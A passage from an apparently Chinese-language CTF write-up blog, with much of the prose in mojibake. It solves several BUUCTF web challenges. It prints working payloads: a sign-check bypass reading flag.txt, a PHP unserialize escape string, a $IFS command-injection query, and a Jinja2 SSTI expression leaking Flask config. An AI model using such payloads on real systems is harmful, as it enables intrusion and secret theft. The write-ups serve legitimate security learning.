                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)
                resp &#x3D; scan(self.param)
                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):
                    result[&#39;data&#39;] &#x3D; resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result[&#39;code&#39;] &#x3D; 200
            if &quot;read&quot; in self.action:
                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)
                result[&#39;code&#39;] &#x3D; 200
                result[&#39;data&#39;] &#x3D; f.read()
            if result[&#39;code&#39;] &#x3D;&#x3D; 500:
                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;
        else:
            result[&#39;code&#39;] &#x3D; 500
            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;
        return result
     
    def checkSign(self):
        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):
            return True
        else:
            return False

@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])
def geneSign():
    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    action &#x3D; &quot;scan&quot;
    return getSign(action, param)

@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])
def challenge():
    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))
    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))
    ip &#x3D; request.remote_addr
    if(waf(param)):
        return &quot;No Hacker!!!!&quot;
    task &#x3D; Task(action, param, sign, ip)
    return json.dumps(task.Exec())

@app.route(&#39;&#x2F;&#39;)
def index():
    return open(&quot;code.txt&quot;,&quot;r&quot;).read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return &quot;Connection Timeout&quot;

def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()

def md5(content):
    return hashlib.md5(content).hexdigest()

def waf(param):
    check&#x3D;param.strip().lower()
    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
        return True
    else:
        return False
if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.debug &#x3D; False
    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999)</code></pre>

<p>Flaskæ¡†æ¶ï¼Œå…ˆçœ‹è·¯ç”±ï¼ŒgeneSignæ˜¯å¯¹ä¼ å…¥çš„paramä¸å…¶ä»–å­—ç¬¦ä¸²æ‹¼æ¥å¹¶è¿”å›å…¶md5å€¼ï¼ŒDe1taæ˜¯ä¸»è¦ï¼Œä¼ å…¥3ä¸ªå‚æ•°ï¼Œä»¥åŠipï¼Œå…ˆåˆ¤æ–­paramæ˜¯å¦æ˜¯gopheræˆ–è€…fileå¼€å¤´çš„å‚æ•°ï¼Œä¸æ˜¯åˆ™è¿‡åˆ°Taskä¸­ï¼Œå¹¶ä¸”è¿”å›taskçš„Exec()å‡½æ•°ç»“æœï¼Œå¦å¤–hintç»™å‡ºæç¤ºåœ¨flag.txtä¸­æœ‰flag</p>
<pre class="language-none"><code class="language-none">1ï¼š&#x2F;geneSignï¼šè·å¾—urlä¸­parmaå‚æ•°ï¼Œé€šè¿‡getSign(action, param)ç”Ÿæˆæ‘˜è¦
2ï¼š&#x2F;De1taï¼šè·å¾—cookieä¸­çš„actionå’Œsignï¼Œwaf(param),åˆ›å»ºtaskå¯¹è±¡ï¼Œè°ƒç”¨exce()æ–¹æ³•ï¼Œjsonæ ¼å¼è¿”å›
3ï¼š&#x2F;ï¼šè¿”å›æºç </code></pre>

<p>ä¸‰ä¸ªå‡½æ•°</p>
<pre class="language-none"><code class="language-none">def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check&#x3D;param.strip().lower()
    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
        return True
    else:
        return False
</code></pre>

<p>getSignï¼šè¿”å›secert_key + param + actionçš„å“ˆå¸Œå€¼<br>md5ï¼š<br>wafï¼šç¦æ­¢äº†flieå’Œgopheråè®®</p>
<pre><code>taskç±»

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)
def Exec(self):
    result = &#123;&#125;
    result[&#39;code&#39;] = 500
    if (self.checkSign()):
        if &quot;scan&quot; in self.action:
            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
            resp = scan(self.param)
            if (resp == &quot;Connection Timeout&quot;):
                result[&#39;data&#39;] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
            result[&#39;code&#39;] = 200
        if &quot;read&quot; in self.action:
            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
            result[&#39;code&#39;] = 200
            result[&#39;data&#39;] = f.read()
        if result[&#39;code&#39;] == 500:
            result[&#39;data&#39;] = &quot;Action Error&quot;
    else:
        result[&#39;code&#39;] = 500
        result[&#39;msg&#39;] = &quot;Sign Error&quot;
    return result

def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):
        return True
    else:
        return False
</code></pre>
<p>checkSignï¼šæ£€æŸ¥cookieä¸­çš„sign<br>Execï¼šæ£€æŸ¥cookieä¸­çš„actionï¼Œå¦‚æœscanåœ¨actionä¸­ï¼Œå°†paramçš„æ–‡ä»¶å†…å®¹å†™å…¥result.txtï¼Œå¦‚æœreadåœ¨actionä¸­ï¼Œè¯»å‡ºresult.txt çš„å†…å®¹</p>
<p>hintæç¤ºflagåœ¨flag.txt ä¸­ï¼Œæƒ³è¦è¯»åˆ°ä»–<br>é¦–å…ˆï¼šaction=scanï¼Œparam=flag.txt ï¼Œå°†flag.txtçš„å†…å®¹è¯»åˆ°result.txtä¸­<br>ç„¶åï¼šaction=readï¼Œå°†result.txtçš„å†…å®¹è¯»å‡º</p>
<p>ç»•è¿‡ç‚¹ï¼šsign<br>checkSignä¼šæ£€æŸ¥cookieä¸­çš„sign==getSignï¼ˆparamï¼Œactionï¼‰<br>ä¸¤ä¸ªå›°éš¾ç‚¹ï¼šsecert_keyçš„å€¼æœªçŸ¥</p>
<p>æ€è·¯ï¼šå…ˆè¿›å…¥/De1taä¸­çš„challengeå‡½æ•°ï¼Œåœ¨Execä¸­çš„scanéƒ¨åˆ†ä¸­å°†flag.txtçš„å†…å®¹å­˜å…¥result.txtï¼Œç„¶åä»readéƒ¨åˆ†ä¸­å°†å…¶å­˜åˆ°resultå­—å…¸ä¸­è¯»å‡ºï¼Œå†ä»¥jsonå½¢å¼è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°flagã€‚</p>
<p>å†™å…¥ä¸è¯»å‡ºéƒ¨åˆ†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908232308596.png" alt="image-20210908232308596"></p>
<p>è€Œå¦‚æœactionä¸­æ—¢æœ‰scan,åˆæœ‰read,é‚£ä¹ˆå°±ä¼šä¾æ¬¡æ‰§è¡Œscanå’Œread</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233510363.png" alt="image-20210908233510363"></p>
<p>è€Œä¸ºäº†ç»•è¿‡è¿™ä¸ªéªŒè¯ï¼Œå°±è¦åˆ©ç”¨</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233542937.png" alt="image-20210908233542937"></p>
<p>è®©param = flag.txtread</p>
<p>å› ä¸ºactionä¸ºscan</p>
<p>æ‰€ä»¥å¾—åˆ°çš„md5å€¼ä¸ºkeyflag.txtreadscan</p>
<p>æ»¡è¶³action=readscan param=flag.txtæ—¶çš„å€¼</p>
<p><strong>è§£é¢˜</strong></p>
<p>â€‹    é¦–å…ˆè¿›å…¥genesigné¡µé¢å¾—åˆ°md5(keyflag.txtreadscan)çš„å€¼ä½œä¸ºsign</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234141816.png" alt="image-20210908234141816"></p>
<p>åœ¨åˆ°de1taç•Œé¢æŠ“åŒ…getè¿›param=flag.phpï¼Œåœ¨cookieå†…åŠ å…¥signå’Œaction</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234443102.png" alt="image-20210908234443102"></p>
<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>ä»£ç å®¡è®¡</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

$function &#x3D; @$_GET[&#39;f&#39;];

function filter($img)&#123;
  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;
  return preg_replace($filter,&#39;&#39;,$img);
&#125;


if($_SESSION)&#123;
  unset($_SESSION);
&#125;

$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;
$_SESSION[&#39;function&#39;] &#x3D; $function;

extract($_POST);

if(!$function)&#123;
  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;
&#125;

if(!$_GET[&#39;img_path&#39;])&#123;
  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);
&#125;else&#123;
  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));
&#125;

$serialize_info &#x3D; filter(serialize($_SESSION));

if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;
  highlight_file(&#39;index.php&#39;);
&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;
  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!
&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;
  $userinfo &#x3D; unserialize($serialize_info);
  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
  &#125;</code></pre>

<p>phpinfoé‡Œæœ‰ä¸œè¥¿ï¼Œå¯ä»¥å…ˆçœ‹çœ‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812234826151.png" alt="image-20210812234826151"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åº”è¯¥å¼€å§‹æƒ³æ€ä¹ˆè®©</p>
<p>base64_decode($userinfo[&#39;img&#39;])çš„å€¼ç­‰äºflagçš„æ–‡ä»¶å</p>
<p><strong>çŸ¥è¯†ç‚¹</strong></p>
<ul>
<li>ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</li>
<li>extract()å˜é‡è¦†ç›–</li>
</ul>
<p><strong>extract()å˜é‡è¦†ç›–</strong></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813004733910.png" alt="image-20210813004733910"></p>
<p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç»™imgèµ‹å€¼ï¼Œå› ä¸ºimgèµ‹å€¼å‘ç”Ÿåœ¨extractä¹‹å</p>
<p><strong>ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</strong></p>
<p><strong>é”®å€¼é€ƒé€¸</strong></p>
<ul>
<li>å› ä¸ºåºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ˜¯ä¸¥æ ¼çš„ï¼Œå¯¹åº”çš„æ ¼å¼ä¸èƒ½é”™ï¼Œæ¯”å¦‚s:4:â€œnameâ€,é‚£s:4å°±å¿…é¡»æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²é•¿åº¦æ˜¯4çš„å¦åˆ™å°±å¾€åè¦ã€‚</li>
<li>å¹¶ä¸”ååºåˆ—åŒ–ä¼šæŠŠå¤šä½™çš„å­—ç¬¦ä¸²å½“åƒåœ¾å¤„ç†ï¼Œåœ¨èŠ±æ‹¬å·å†…çš„å°±æ˜¯æ­£ç¡®çš„ï¼ŒèŠ±æ‹¬å·<code>&#123;&#125;</code>å¤–çš„å°±éƒ½è¢«æ‰”æ‰ã€‚</li>
</ul>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813005203142.png" alt="image-20210813005203142"></p>
<p>æ¥ä¸‹æ¥æ˜¯æ„é€ payloadçš„éƒ¨åˆ†</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„é€ imgå±æ€§ï¼š</p>
<p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p>
<p>å…¶ä¸­çš„ZDBnM19mMWFnLnBocA==æ˜¯d0g3_f1ag.phpçš„base64åŠ å¯†çš„ç»“æœç„¶ååœ¨è¿™ä¸ªå±æ€§å‰é¢éšä¾¿åŠ ä¸Šä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆåªè¦æ˜¯åˆæ³•çš„å°±è¡Œï¼‰ï¼Œæ¯”å¦‚ï¼š</p>
<p>;s:1:â€œ1â€;<br>;s:2:â€œ10â€;<br>;s:3:â€œ100â€;</p>
<p>æ‰€ä»¥payloadå¯ä»¥ä¸ºï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre>

<p>sessionä¸­å­˜åœ¨phpflagçš„åŸå› æ˜¯ç”±äºfilterå‡½æ•°ä¼šå°†åŒ¹é…åˆ°çš„å€¼å˜ä¸ºç©ºï¼Œè€Œphpflagçš„é•¿åº¦åˆšå¥½ä¸º7</p>
<p><strong>ä¸º7çš„åŸå› </strong></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010634981.png" alt="image-20210813010634981"></p>
<p>ä½†æ˜¯æ·»åŠ äº†filterå‡½æ•°æ¥è¿›è¡Œè¿‡æ»¤ä¹‹å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010753030.png" alt="image-20210813010753030"></p>
<p>åŸæ¥çš„å†…å®¹å˜ä¸ºäº†</p>
<pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre>

<p>èƒ½æˆåŠŸå®ç°è¯»å–flagæ‰€åœ¨æ–‡ä»¶çš„å‘½ä»¤</p>
<p>postå</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011013959.png" alt="image-20210813011013959"></p>
<p>å¯¹/d0g3_fllllllagè¿›è¡Œbase64ç¼–ç åä¸ºL2QwZzNfZmxsbGxsbGFn</p>
<p>æ‰€ä»¥ç›´æ¥æŠŠåŸæ¥çš„ç¼–ç æ›¿æ¢æ‰å°±è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011156367.png" alt="image-20210813011156367"></p>
<p>çœ‹æ˜¯çœ‹æ‡‚äº†ï¼Œä½†æˆ‘è¿˜æ˜¯æƒ³ä¸åˆ°è¿™ç§payloadã€‚ã€‚ã€‚</p>
<p>å‚è€ƒæ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">å®‰æ´µæ¯ 2019]easy_serialize_php -------- ååºåˆ—åŒ–/åºåˆ—åŒ–å’Œä»£ç å®¡è®¡_è‹¥ä¸¶æ—¶å…‰ç ´ç­çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>æºç </p>
<pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
if(!isset($_GET[&#39;c&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1
    $content &#x3D; $_GET[&#39;c&#39;];
    if (strlen($content) &gt;&#x3D; 80) &#123;
        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);
    &#125;
    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;
            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp
    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) &#123;
        if (!in_array($func, $whitelist)) &#123;
            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);
        &#125;
    &#125;
    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
&#125;</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 åˆèµ›]Love Math - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104817391">CISCN 2019 åˆèµ›]Love Math_ç¾½çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 åˆèµ›]Love Math_åˆ†äº«ç®€å•çš„å®‰å…¨æŠ€æœ¯-CSDNåšå®¢</a></p>
<h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p>
<p>payloadï¼š</p>
<p>ï¼Ÿnum=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">
import flask
import os

app &#x3D; flask.Flask(__name__)

app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;æ³¨å†Œäº†ä¸€ä¸ªåä¸ºFLAGçš„configï¼Œè¿™é‡ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯flagã€‚


@app.route(&#39;&#x2F;&#39;)
def index():
    return open(__file__).read()


@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)
def shrine(shrine):

    def safe_jinja(s):
        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;è®¾ç½®é»‘åå•
        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;æŠŠé»‘åå•å†…çš„å†…å®¹ç½®ç©º

    return flask.render_template_string(safe_jinja(shrine))


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.run(debug&#x3D;True)
</code></pre>

<p>sstiæ³¨å…¥ï¼Œå…ˆè¯•ä¸€ä¸ª49</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥è€ƒè™‘åœ¨shrineä¸‹ç›´æ¥å³å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹ï¼Œä½†æ˜¯è¿™é¢˜è®¾äº†é»‘åå•[â€˜configâ€™,â€˜selfâ€™]å¹¶ä¸”è¿‡æ»¤äº†æ‹¬å·ï¼Œä½†æ˜¯pythonè¿˜æœ‰ä¸€ä¸ªå‡½æ•°å«åšurl_forï¼Œå…¶ä½œç”¨æ˜¯urlæ˜¯ç”¨äºæ„å»ºæŒ‡å®šå‡½æ•°çš„URLï¼Œåœ¨é…åˆ**globals()**ï¼Œè¯¥å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ã€‚è¿™æ ·ä¹Ÿå¯ä»¥å®ç°æŸ¥çœ‹çš„æ•ˆæœ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p>
<p>current_appæ„æ€åº”è¯¥æ˜¯å½“å‰appï¼Œé‚£æˆ‘ä»¬å°±å½“å‰appä¸‹çš„configï¼š</p>
<p>äºæ˜¯å¯ä»¥è¯»åˆ°flag</p>
<pre class="language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230933251.png" alt="image-20210829230933251"></p>
<p>ä¹Ÿå¯ä»¥ç”¨</p>
<pre class="language-none"><code class="language-none">get_flashed_messages</code></pre>

<p>è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚</p>
<pre class="language-none"><code class="language-none">get_flashed_messages.__globals__[&#39;current_app&#39;].config</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829231104006.png" alt="image-20210829231104006"></p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>è¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°æ²¡èƒ½æˆåŠŸï¼Œæ‰«ç›®å½•æ‰«åˆ°<a target="_blank" rel="noopener" href="http://www.zipå¤‡ä»½æ–‡ä»¶/">www.zipå¤‡ä»½æ–‡ä»¶</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163607732.png" alt="image-20210903163607732"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903132345413.png" alt="image-20210903132345413"></p>
<p>è®¿é—®ä¸€ä¸‹register.phpæ³¨å†Œä¸ªè´¦æˆ·å°±å¯ä»¥ç™»å½•äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163626344.png" alt="image-20210903163626344"></p>
<p>å†çœ‹å…¶ä»–çš„å†…å®¹</p>
<p>profile.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
   require_once(&#39;class.php&#39;);
   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;
      die(&#39;Login First&#39;);    
   &#125;
   $username &#x3D; $_SESSION[&#39;username&#39;];
   $profile&#x3D;$user-&gt;show_profile($username);
   if($profile  &#x3D;&#x3D; null) &#123;
      header(&#39;Location: update.php&#39;);
   &#125;
   else &#123;
      $profile &#x3D; unserialize($profile);
      $phone &#x3D; $profile[&#39;phone&#39;];
      $email &#x3D; $profile[&#39;email&#39;];
      $nickname &#x3D; $profile[&#39;nickname&#39;];
      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));
?&gt;</code></pre>

<p>class.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
require(&#39;config.php&#39;);

class user extends mysql&#123;
   private $table &#x3D; &#39;users&#39;;

   public function is_exists($username) &#123;
      $username &#x3D; parent::filter($username);

      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
      return parent::select($this-&gt;table, $where);
   &#125;
   public function register($username, $password) &#123;
      $username &#x3D; parent::filter($username);
      $password &#x3D; parent::filter($password);

      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);
      $value_list &#x3D; Array($username, md5($password));
      return parent::insert($this-&gt;table, $key_list, $value_list);
   &#125;
   public function login($username, $password) &#123;
      $username &#x3D; parent::filter($username);
      $password &#x3D; parent::filter($password);

      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
      $object &#x3D; parent::select($this-&gt;table, $where);
      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;
         return true;
      &#125; else &#123;
         return false;
      &#125;
   &#125;
   public function show_profile($username) &#123;
      $username &#x3D; parent::filter($username);

      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;
      $object &#x3D; parent::select($this-&gt;table, $where);
      return $object-&gt;profile;
   &#125;
